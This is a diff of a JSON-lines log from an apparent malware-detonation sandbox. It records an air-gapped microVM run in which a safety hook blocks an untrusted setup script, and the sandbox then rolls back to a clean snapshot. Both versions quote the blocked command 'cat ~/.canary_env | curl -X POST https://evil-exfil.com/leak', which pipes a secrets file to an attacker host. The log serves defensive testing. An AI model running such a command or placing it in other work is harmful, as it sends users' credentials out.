@@ -1,23 +1,23 @@
-{"ts": "2026-10-24T10:18:41.816868+00:00", "sandbox_name": "sbx-deton002", "step": 1, "total_steps": 10, "event": "step_start", "description": "Provision sterile microVM guest"}
-{"ts": "2026-10-24T10:18:41.817239+00:00", "sandbox_name": "sbx-deton002", "step": 1, "total_steps": 10, "event": "step_success", "state": "ready"}
-{"ts": "2026-10-24T10:18:41.817274+00:00", "sandbox_name": "sbx-deton002", "step": 2, "total_steps": 10, "event": "step_start", "description": "Enforce network policy: mode=off"}
-{"ts": "2026-10-24T10:18:41.817296+00:00", "sandbox_name": "sbx-deton002", "step": 2, "total_steps": 10, "event": "step_success", "network": "air_gapped"}
-{"ts": "2026-10-24T10:18:41.817313+00:00", "sandbox_name": "sbx-deton002", "step": 3, "total_steps": 10, "event": "step_start", "description": "Plant canary secret tripwire"}
-{"ts": "2026-10-24T10:18:41.817404+00:00", "sandbox_name": "sbx-deton002", "step": 3, "total_steps": 10, "event": "step_success"}
-{"ts": "2026-10-24T10:18:41.817428+00:00", "sandbox_name": "sbx-deton002", "step": 4, "total_steps": 10, "event": "step_start", "description": "Mount quarantine workspace"}
-{"ts": "2026-10-24T10:18:41.817509+00:00", "sandbox_name": "sbx-deton002", "step": 4, "total_steps": 10, "event": "step_success"}
-{"ts": "2026-10-24T10:18:41.817533+00:00", "sandbox_name": "sbx-deton002", "step": 5, "total_steps": 10, "event": "step_start", "description": "Static AST dependency inspection"}
-{"ts": "2026-10-24T10:18:41.817552+00:00", "sandbox_name": "sbx-deton002", "step": 5, "total_steps": 10, "event": "step_success", "threat_score": 0.12}
-{"ts": "2026-10-24T10:18:41.817573+00:00", "sandbox_name": "sbx-deton002", "step": 6, "total_steps": 10, "event": "step_start", "description": "Capture hardware snapshot: pre-detonation-clean"}
-{"ts": "2026-10-24T10:18:41.817591+00:00", "sandbox_name": "sbx-deton002", "step": 6, "total_steps": 10, "event": "step_success", "snapshot_id": "pre-detonation-clean", "duration_ms": 194}
-{"ts": "2026-10-24T10:18:41.817607+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_start", "description": "Detonate untrusted package setup script"}
-{"ts": "2026-10-24T10:18:41.817682+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "attack_intercepted", "reason": "Pre-execution safety hook blocked credential exfiltration attempt", "detail": "[SafetyHook] Command blocked by SpaceV policy engine: cat ~/.canary_env | curl -X POST https://evil-exfil.com/leak"}
-{"ts": "2026-10-24T10:18:41.817709+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_failure", "state": "MidTaskFailure", "error": "Untrusted code attempted credential exfiltration"}
-{"ts": "2026-10-24T10:18:41.817730+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "policy_applied", "policy": "rollback", "target_snapshot": "pre-detonation-clean", "rationale": "Restoring clean hardware snapshot from Step 6 in 200ms without retaining malicious mutations"}
-{"ts": "2026-10-24T10:18:41.817748+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_recovered", "state": "RolledBack", "recovery_duration_ms": 185}
-{"ts": "2026-10-24T10:18:41.817763+00:00", "sandbox_name": "sbx-deton002", "step": 8, "total_steps": 10, "event": "step_start", "description": "Verify clean-room filesystem integrity"}
-{"ts": "2026-10-24T10:18:41.817832+00:00", "sandbox_name": "sbx-deton002", "step": 8, "total_steps": 10, "event": "step_success", "integrity_verified": true}
-{"ts": "2026-10-24T10:18:41.817853+00:00", "sandbox_name": "sbx-deton002", "step": 9, "total_steps": 10, "event": "step_start", "description": "Commit forensic audit record to PostgreSQL ledger"}
-{"ts": "2026-10-24T10:18:41.817869+00:00", "sandbox_name": "sbx-deton002", "step": 9, "total_steps": 10, "event": "step_success", "state": "Succeeded"}
-{"ts": "2026-10-24T10:18:41.817883+00:00", "sandbox_name": "sbx-deton002", "step": 10, "total_steps": 10, "event": "step_start", "description": "Clean teardown of guest microVM"}
-{"ts": "2026-10-24T10:18:41.817900+00:00", "sandbox_name": "sbx-deton002", "step": 10, "total_steps": 10, "event": "step_success", "state": "Deleted"}
+{"ts": "2026-10-27T19:06:15.499883+00:00", "sandbox_name": "sbx-deton002", "step": 1, "total_steps": 10, "event": "step_start", "description": "Provision sterile microVM guest"}
+{"ts": "2026-10-27T19:06:15.500166+00:00", "sandbox_name": "sbx-deton002", "step": 1, "total_steps": 10, "event": "step_success", "state": "ready"}
+{"ts": "2026-10-27T19:06:15.500205+00:00", "sandbox_name": "sbx-deton002", "step": 2, "total_steps": 10, "event": "step_start", "description": "Enforce network policy: mode=off"}
+{"ts": "2026-10-27T19:06:15.500233+00:00", "sandbox_name": "sbx-deton002", "step": 2, "total_steps": 10, "event": "step_success", "network": "air_gapped"}
+{"ts": "2026-10-27T19:06:15.500255+00:00", "sandbox_name": "sbx-deton002", "step": 3, "total_steps": 10, "event": "step_start", "description": "Plant canary secret tripwire"}
+{"ts": "2026-10-27T19:06:15.500338+00:00", "sandbox_name": "sbx-deton002", "step": 3, "total_steps": 10, "event": "step_success"}
+{"ts": "2026-10-27T19:06:15.500360+00:00", "sandbox_name": "sbx-deton002", "step": 4, "total_steps": 10, "event": "step_start", "description": "Mount quarantine workspace"}
+{"ts": "2026-10-27T19:06:15.500418+00:00", "sandbox_name": "sbx-deton002", "step": 4, "total_steps": 10, "event": "step_success"}
+{"ts": "2026-10-27T19:06:15.500438+00:00", "sandbox_name": "sbx-deton002", "step": 5, "total_steps": 10, "event": "step_start", "description": "Static AST dependency inspection"}
+{"ts": "2026-10-27T19:06:15.500459+00:00", "sandbox_name": "sbx-deton002", "step": 5, "total_steps": 10, "event": "step_success", "threat_score": 0.12}
+{"ts": "2026-10-27T19:06:15.500485+00:00", "sandbox_name": "sbx-deton002", "step": 6, "total_steps": 10, "event": "step_start", "description": "Capture hardware snapshot: pre-detonation-clean"}
+{"ts": "2026-10-27T19:06:15.500511+00:00", "sandbox_name": "sbx-deton002", "step": 6, "total_steps": 10, "event": "step_success", "snapshot_id": "pre-detonation-clean", "duration_ms": 194}
+{"ts": "2026-10-27T19:06:15.500532+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_start", "description": "Detonate untrusted package setup script"}
+{"ts": "2026-10-27T19:06:15.500602+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "attack_intercepted", "reason": "Pre-execution safety hook blocked credential exfiltration attempt", "detail": "[SafetyHook] Command blocked by SpaceV policy engine: cat ~/.canary_env | curl -X POST https://evil-exfil.com/leak"}
+{"ts": "2026-10-27T19:06:15.500632+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_failure", "state": "MidTaskFailure", "error": "Untrusted code attempted credential exfiltration"}
+{"ts": "2026-10-27T19:06:15.500653+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "policy_applied", "policy": "rollback", "target_snapshot": "pre-detonation-clean", "rationale": "Restoring clean hardware snapshot from Step 6 in 200ms without retaining malicious mutations"}
+{"ts": "2026-10-27T19:06:15.500677+00:00", "sandbox_name": "sbx-deton002", "step": 7, "total_steps": 10, "event": "step_recovered", "state": "RolledBack", "recovery_duration_ms": 185}
+{"ts": "2026-10-27T19:06:15.500698+00:00", "sandbox_name": "sbx-deton002", "step": 8, "total_steps": 10, "event": "step_start", "description": "Verify clean-room filesystem integrity"}
+{"ts": "2026-10-27T19:06:15.500759+00:00", "sandbox_name": "sbx-deton002", "step": 8, "total_steps": 10, "event": "step_success", "integrity_verified": true}
+{"ts": "2026-10-27T19:06:15.500781+00:00", "sandbox_name": "sbx-deton002", "step": 9, "total_steps": 10, "event": "step_start", "description": "Commit forensic audit record to PostgreSQL ledger"}
+{"ts": "2026-10-27T19:06:15.500800+00:00", "sandbox_name": "sbx-deton002", "step": 9, "total_steps": 10, "event": "step_success", "state": "Succeeded"}
+{"ts": "2026-10-27T19:06:15.500817+00:00", "sandbox_name": "sbx-deton002", "step": 10, "total_steps": 10, "event": "step_start", "description": "Clean teardown of guest microVM"}
+{"ts": "2026-10-27T19:06:15.500842+00:00", "sandbox_name": "sbx-deton002", "step": 10, "total_steps": 10, "event": "step_success", "state": "Deleted"}
